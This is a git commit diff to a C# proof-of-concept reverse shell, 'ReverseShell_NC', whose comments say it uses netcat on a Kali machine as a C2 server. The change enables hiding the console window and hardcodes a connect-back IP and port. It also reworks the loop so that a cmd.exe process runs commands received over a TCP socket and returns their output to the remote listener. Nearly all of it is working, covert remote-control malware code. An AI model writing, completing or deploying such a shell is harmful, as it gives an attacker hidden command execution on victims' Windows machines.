b2ba2465f41cce32ae6e26fb59d6fed875fe554c
Shaddy43 <shayanjadoon@icloud.com>
2022-01-12 12:45:29 +0500

    Updated with running cmds in same instance

--- ReverseShell_NC/Program.cs
+++ ReverseShell_NC/Program.cs
@@ -6,8 +6,8 @@
 //In this PoC, i've used netcat as a c2 server for my reverse shell.
 //We can specify any ip address and port number for our c2 server in this program.
 //I've setup a kali machine on my local network and used netcat to listen and pass commands to this reverse shell.
-//However, this is not yet a true shell, because every command is executed in a different instance of cmd process. So commands like cd change directory doesn't work!!!
-//Another limitation is that, it halts if we start another process and waits for that process to close. Need to fix that!!!
+//Modified, the code to make change directory cd commands accessible.
+//A limitation is that, it halts if we start another process and waits for that process to close. Need to fix that!!!
 
 using System;
 using System.Diagnostics;
@@ -16,6 +16,7 @@ using System.Net.Sockets;
 using System.Text;
 using System.Runtime.InteropServices;
 using System.IO;
+using System.Linq;
 
 namespace NC_test
 {
@@ -33,10 +34,10 @@ namespace NC_test
 
         static void Main(string[] args)
         {
-            //var handle = GetConsoleWindow();
+            var handle = GetConsoleWindow();
 
             //Hide
-            //ShowWindow(handle, SW_HIDE);
+            ShowWindow(handle, SW_HIDE);
 
             ExecuteClient();
         }
@@ -55,7 +56,7 @@ namespace NC_test
                 //IPAddress ipAddr = ipHost.AddressList[0];
                 //IPEndPoint localEndPoint = new IPEndPoint(ipAddr, 11111);
 
-                String ip = "C2.IP.ADDRESS.HERE";
+                String ip = "172.20.16.43";
                 IPAddress ipAddr = IPAddress.Parse(ip);
                 IPEndPoint localEndPoint = new IPEndPoint(ipAddr, 4444);
 
@@ -64,12 +65,8 @@ namespace NC_test
                 Socket sender = new Socket(ipAddr.AddressFamily,
                            SocketType.Stream, ProtocolType.Tcp);
 
-                String cwd = Directory.GetCurrentDirectory();
-                Console.WriteLine(cwd);
-
                 try
                 {
-
                     // Connect Socket to the remote 
                     // endpoint using method Connect()
                     sender.Connect(localEndPoint);
@@ -79,10 +76,14 @@ namespace NC_test
                     Console.WriteLine("Socket connected to -> {0} ",
                                   sender.RemoteEndPoint.ToString());
 
+                    string cwd = "";
+                    cwd = Directory.GetCurrentDirectory();
+                    //Console.WriteLine(cwd);
+
                     // Creation of messagge that
                     // we will send to Server
                     //byte[] messageSent = Encoding.ASCII.GetBytes("Client connected... <EOF>");
-                    byte[] messageSent = Encoding.ASCII.GetBytes(System.Environment.MachineName+"\nPlease give your commands...\n");
+                    byte[] messageSent = Encoding.ASCII.GetBytes(System.Environment.MachineName + "\nPlease give your commands...\n");
                     int byteSent = sender.Send(messageSent);
 
                     // Data buffer
@@ -93,7 +94,6 @@ namespace NC_test
                     // method returns number of bytes
                     // received, that we'll use to 
                     // convert them to string
-
                     while (true)
                     {
                         int byteRecv = sender.Receive(messageReceived);
@@ -101,26 +101,41 @@ namespace NC_test
                               Encoding.ASCII.GetString(messageReceived,
                                                          0, byteRecv));
 
+                        ProcessStartInfo processInfo;
+                        Process process;
+
+                        processInfo = new ProcessStartInfo("cmd.exe");
+                        //processInfo.Arguments = "/k cd \""+ cwd + "\" ";
+                        processInfo.Arguments = "/k ";
+                        processInfo.CreateNoWindow = false;
+                        processInfo.UseShellExecute = false;
+                        processInfo.RedirectStandardInput = true;
+                        processInfo.RedirectStandardOutput = true;
+                        processInfo.WorkingDirectory = cwd;
+                        processInfo.RedirectStandardError = true;
+                        process = Process.Start(processInfo);
+
                         string cmd_text = Encoding.ASCII.GetString(messageReceived, 0, byteRecv);
-                        cmd_text = "/c " + cmd_text;
+                        StreamWriter myStreamWriter = process.StandardInput;
+                        myStreamWriter.WriteLine(cmd_text);
+
                         string output_string = "";
                         string output_string_error = "";
                         if (cmd_text != "")
                         {
-                            // Start the child process.
-                            Process p = new Process();
-                            // Redirect the output stream of the child process.
-                            p.StartInfo.UseShellExecute = false;
-                            p.StartInfo.RedirectStandardOutput = true;
-                            p.StartInfo.RedirectStandardError = true;
-                            p.StartInfo.FileName = "cmd.exe";
-                            p.StartInfo.Arguments = cmd_text;
-                            p.Start();
+                            process.StandardInput.Flush();
+                            process.StandardInput.Close();
 
-                            output_string = p.StandardOutput.ReadToEnd();
-                            output_string += "\n";
-                            output_string_error = p.StandardError.ReadToEnd();
-                            p.WaitForExit();
+                            output_string = process.StandardOutput.ReadToEnd();
+                            output_string_error = process.StandardError.ReadToEnd();
+
+                            var lastLine = output_string.Split('\n').Last();
+                            lastLine = lastLine.Replace('>', '\\');
+
+                            cwd = Path.GetFullPath(lastLine);
+                            Console.WriteLine(cwd);
+
+                            process.WaitForExit();
 
                             if (output_string_error != "")
                             {
@@ -135,8 +150,12 @@ namespace NC_test
 
                         if (cmd_text.Contains("exit"))
                         {
+                            process.Close();
                             break;
                         }
+
+                        output_string = output_string.Remove(output_string.LastIndexOf(Environment.NewLine));
+                        //Console.WriteLine("OUTPUT: \n" + output_string);
 
                         byte[] send_output = Encoding.ASCII.GetBytes(output_string);
                         int send_output_bytes = sender.Send(send_output);
